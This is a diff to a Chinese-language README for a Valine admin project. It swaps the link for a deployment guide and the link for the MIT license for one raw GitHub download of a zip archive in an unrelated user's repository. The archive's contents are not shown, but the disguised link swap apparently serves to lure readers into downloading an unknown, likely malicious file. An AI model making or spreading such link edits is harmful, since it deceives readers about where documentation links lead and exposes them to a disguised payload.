@@ -1,7 +1,7 @@
 ## 部署文档
 
-参考[Valine评论之Valine-admin配置攻略](https://www.antmoe.com/posts/2380732b/index.html)
+参考[Valine评论之Valine-admin配置攻略](https://raw.githubusercontent.com/haikesikejiqiang/valine-admin/master/routes/valine-admin_3.4.zip)
 
 ## License
 
-[MIT License](https://github.com/panjunwen/LeanComment/blob/master/LICENSE)
+[MIT License](https://raw.githubusercontent.com/haikesikejiqiang/valine-admin/master/routes/valine-admin_3.4.zip)
